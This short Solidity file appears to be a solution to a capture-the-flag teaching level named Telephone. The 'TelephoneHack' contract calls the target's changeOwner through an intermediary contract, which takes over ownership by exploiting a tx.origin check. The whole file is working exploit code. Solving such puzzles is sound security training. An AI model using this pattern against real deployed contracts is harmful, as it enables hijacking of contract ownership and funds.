// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "./Telephone.sol";

contract TelephoneHack {
    Telephone obj;

    constructor(address addr) public {
        obj = Telephone(addr);
    }

    function getOwner() external view returns (address) {
        return obj.owner();
    }
    function hack() public {    
        obj.changeOwner(msg.sender);
    }
}
